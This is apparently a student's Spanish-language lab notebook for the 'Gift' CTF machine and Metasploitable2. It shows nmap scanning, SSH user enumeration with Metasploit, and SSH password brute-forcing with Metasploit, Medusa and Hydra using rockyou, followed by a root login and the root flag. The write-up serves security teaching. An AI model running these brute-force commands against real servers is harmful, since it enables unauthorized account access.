Parte de [[Maquinas]] y [[Enumeracion de Servicios]]

>1. Barrido de exploracion desde 192.168.56.100 a la 192.168.56.254

``` bash
sudo nmap -sn 192.168.56.100/24
```

Otra opcion:

``` bash
sudo nmap -sn 192.168.56.100-254
```

Salida (de la primera opcion):

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 20:41 CET
Nmap scan report for 192.168.56.1
Host is up (0.00020s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.0010s latency).
MAC Address: 08:00:27:02:65:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00077s latency).
MAC Address: 08:00:27:7B:8B:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00072s latency).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.11 seconds
```

La IP de la maquina Gift es 192.168.56.103 (ya que 102 es metasploitable)

Otras opciones serian:

``` bash
sudo arp-scan -I eth1 192.168.56.100-192.168.56.254
sudo netdiscover -i eht1 -r 192.168.56.0/24
```

Netdiscover tambien puede trabajar en modo pasivo

> 2. Escaneo de puertos:

``` bash
sudo nmap -n -Pn -sV -O -p- 192.168.56.103 -oN nmap_output.txt
```

Salida:

``` java
Nmap scan report for 192.168.56.103
Host is up (0.0015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```


---

Siguiendo la parte de clase, exploracion completa de gift:

``` bash
sudo nmap -n -Pn -sS -sV -sC -O -p- 192.168.56.103 -oA gift_fullscan
```

Salida:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:45 CET
Nmap scan report for 192.168.56.103
Host is up (0.00082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

La maquina tiene un servicio SSH en el puerto 22 y un puerto HTTP en el puerto 80 hosteando la siguiente informacion:

``` bash
curl http://192.168.56.103:80

Dont Overthink. Really, Its simple.
	<!-- Trust me -->

```

Procedemos con la enumeracion del servicio SSH:

Con nmap:

```bash
sudo nmap -n -Pn --script ssh-auth-methods.nse -p 22 192.168.56.103
```

Salida:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:55 CET
Nmap scan report for 192.168.56.103
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|_    keyboard-interactive
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Se permite salida por contraseña y clave

Tambien podemos utilizar enumeracion de usuarios (inherente de OpenSSH <7.7) mediante un modulo auxiliar de metasploit:

Con el comando help de msf podemos ver los comandos que tenemos como opcion en cada situacion en la que estemos. Tambien podemos por ejemplo utilizar "help search" para ver opciones de otros comandos.

Buscamos el modulo de enumeracion:

```bash
search scanner ssh
```

Y usamos enumusers:

``` bash
msf6 > use auxiliary/scanner/ssh/ssh_enumusers 
[*] Using action Malformed Packet - view all 2 actions with the show actions command
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][.
                                            ..]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/
                                            using-metasploit/basics/using-metasploit.html
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered foun
                                            d (timing attack only)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet



View the full module info with the info, or info -d command.
```

Configuramos RHOSTS a 192.168.56.103:

``` bash
set RHOSTS 192.168.56.103
```

Y debemos configurar la lista de nombres de usuario:

``` bash
set USER_FILE [path]
```

En este caso usaremos: /usr/share/metasploit-framework/unix_users.txt

Y ejecutamos el modulo auxiliar con run o exploit.

Ejemplo ejecutandolo contra metasploitable2:

``` bash
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 192.168.56.102
RHOST => 192.168.56.102
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.168.56.102:22 - SSH - Using malformed packet technique
[*] 192.168.56.102:22 - SSH - Checking for false positives
[*] 192.168.56.102:22 - SSH - Starting scan
[+] 192.168.56.102:22 - SSH - User 'backup' found
[+] 192.168.56.102:22 - SSH - User 'bin' found
[+] 192.168.56.102:22 - SSH - User 'daemon' found
[+] 192.168.56.102:22 - SSH - User 'distccd' found
[+] 192.168.56.102:22 - SSH - User 'ftp' found
[+] 192.168.56.102:22 - SSH - User 'games' found
[+] 192.168.56.102:22 - SSH - User 'gnats' found
[+] 192.168.56.102:22 - SSH - User 'irc' found
[+] 192.168.56.102:22 - SSH - User 'libuuid' found
[+] 192.168.56.102:22 - SSH - User 'list' found
[+] 192.168.56.102:22 - SSH - User 'lp' found
[+] 192.168.56.102:22 - SSH - User 'mail' found
[+] 192.168.56.102:22 - SSH - User 'man' found
[+] 192.168.56.102:22 - SSH - User 'mysql' found
[+] 192.168.56.102:22 - SSH - User 'news' found
[+] 192.168.56.102:22 - SSH - User 'nobody' found
[+] 192.168.56.102:22 - SSH - User 'postfix' found
[+] 192.168.56.102:22 - SSH - User 'postgres' found
[+] 192.168.56.102:22 - SSH - User 'proxy' found
[+] 192.168.56.102:22 - SSH - User 'root' found
[+] 192.168.56.102:22 - SSH - User 'service' found
[+] 192.168.56.102:22 - SSH - User 'sshd' found
[+] 192.168.56.102:22 - SSH - User 'sync' found
[+] 192.168.56.102:22 - SSH - User 'sys' found
[+] 192.168.56.102:22 - SSH - User 'syslog' found
[+] 192.168.56.102:22 - SSH - User 'user' found
[+] 192.168.56.102:22 - SSH - User 'uucp' found
[+] 192.168.56.102:22 - SSH - User 'www-data' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Sin embargo, esto en nuestra maquina Gift no funciona ya que nuestra version de OpenSSH es 8.3, con lo cual no es susceptible a la enumeracion de usuarios.

---

### Nota propia

Aqui estaria el ataque de fuerza bruta a root (de contraseñas) con msf

``` bash
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.56.103:22 - Starting bruteforce
[+] 192.168.56.103:22 - Success: 'root:simple' 'uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Linux gift 5.4.43-1-lts #2-Alpine SMP Thu, 28 May 2020 20:13:48 UTC i686 Linux '
[*] SSH session 1 opened (192.168.56.100:39205 -> 192.168.56.103:22) at 2025-01-21 19:10:16 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting            Required  Description
   ----              ---------------            --------  -----------
   ANONYMOUS_LOGIN   false                      yes       Attempt to login with a blank username and
                                                          password
   BLANK_PASSWORDS   false                      no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                          yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                       no        Create a new session for every successful l
                                                          ogin
   DB_ALL_CREDS      false                      no        Try each user/password couple stored in the
                                                           current database
   DB_ALL_PASS       false                      no        Add all passwords in the current database t
                                                          o the list
   DB_ALL_USERS      false                      no        Add all users in the current database to th
                                                          e list
   DB_SKIP_EXISTING  none                       no        Skip existing credentials stored in the cur
                                                          rent database (Accepted: none, user, user&r
                                                          ealm)
   PASSWORD                                     no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/meta  no        File containing passwords, one per line
                     sploit/unix_passwords.txt
   RHOSTS            192.168.56.103             yes       The target host(s), see https://docs.metasp
                                                          loit.com/docs/using-metasploit/basics/using
                                                          -metasploit.html
   RPORT             22                         yes       The target port
   STOP_ON_SUCCESS   false                      yes       Stop guessing when a credential works for a
                                                           host
   THREADS           1                          yes       The number of concurrent threads (max one p
                                                          er host)
   USERNAME          root                       no        A specific username to authenticate as
   USERPASS_FILE                                no        File containing users and passwords separat
                                                          ed by space, one pair per line
   USER_AS_PASS      false                      no        Try the username as the password for all us
                                                          ers
   USER_FILE                                    no        File containing usernames, one per line
   VERBOSE           false                      yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```

---

Siguiendo con la clase:

Haremos un ataque de contraseñas con medusa:
En medusa existe el convenio de que una flag en minuscula es un solo objetivo (-u {username}) y que en mayuscula sea varios objetivos (-U {user_file}). Lo mismo para hosts, contraseñas etc.

Con medusa -d podemos ver los modulos disponibles, estos son los modulos que podemos atacar.

En este caso usaremos como fichero de contraseñas el diccionario rockyou

Lo lanzamos contra metasploitable y uno de sus usuarios:

``` bash
medusa -h 192.168.56.102 -u msfadmin -P rockyou.txt -M ssh -e ns -t 5
```

-e ns: Indica que se pruebe la contraseña en blanco y utilizando el propio nombre de usuario como contraseña.
-t: cantidad de hilos en paralelo. Cada hilo hace 3 intentos por conexion antes de desconectarse de ssh. Si se usa un numero muy alto podriamos denegar el servicio o nos podrian bloquear.

Salida:

``` java
Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-01-21 19:29:47 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password:  (1 of 14344393 complete)
2025-01-21 19:29:47 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: msfadmin (2 of 14344393 complete)
2025-01-21 19:29:47 ACCOUNT FOUND: [ssh] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2025-01-21 19:29:48 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: 123456 (3 of 14344393 complete)
2025-01-21 19:29:48 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: 12345 (4 of 14344393 complete)
2025-01-21 19:29:48 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: 123456789 (5 of 14344393 complete)
2025-01-21 19:29:49 ACCOUNT CHECK: [ssh] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: password (6 of 14344393 complete)
```

Otra herramienta practicamente identica seria Hydra, por ejemplo -l/-L para usuario o lista de usuarios, -C para un fichero de credenciales, -p/-P para contraseña o lista de contraseñas, tambien tiene el -e (nsr haria: probar contraseña en blanco (n), probar nombre como contraseña (s), probar nombre invertido como contraseña (r)):

Probando contra metasploitable2:

``` bash
hydra -l sys -P rockyou.txt -e nsr -t 5 ssh://192.168.56.102:22
```

(Se puede añadir verbose con -V)

Salida:

``` java
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-21 19:42:56
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344402 login tries (l:1/p:14344402), ~2868881 tries per task
[DATA] attacking ssh://192.168.56.102:22/
[STATUS] 127.00 tries/min, 127 tries in 00:01h, 14344275 to do in 1882:28h, 5 active
[22][ssh] host: 192.168.56.102   login: sys   password: batman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-21 19:44:32
```

### Ejercicio: Enumerar gift:

Como pudimos ver anteriormente tenemos la salida de NMAP:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:45 CET
Nmap scan report for 192.168.56.103
Host is up (0.00082s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)
|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:dd (ECDSA)
|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

Y SSH nos permite el login mediante contraseña y clave, no obstante no podemos realizar enumeracion de usuarios por la version de OpenSSH:

(esta es la salida del script the nmap ssh-auth-methods.nse)

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 18:55 CET
Nmap scan report for 192.168.56.103
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|_    keyboard-interactive
MAC Address: 08:00:27:73:79:CB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Pero dado que sabemos que es una maquina de Linux, podemos asumir que existe el usuario root sin demasiado miedo a equivocarnos:

Ataque de fuerza bruta a ssh

Comando:

``` bash
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.56.103:22
```

Salida:

``` java
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-16 17:48:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-16 17:48:29
```

La contraseña es "simple" con lo que podemos conectarnos a root por ssh:

``` bash
ssh root@192.168.56.103

The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.
root@192.168.56.103's password: 

IM AN SSH SERVER

gift:~# ls
root.txt  user.txt

gift:~# cat root.txt
HMVtyr543FG
```

Esta es la flag de root!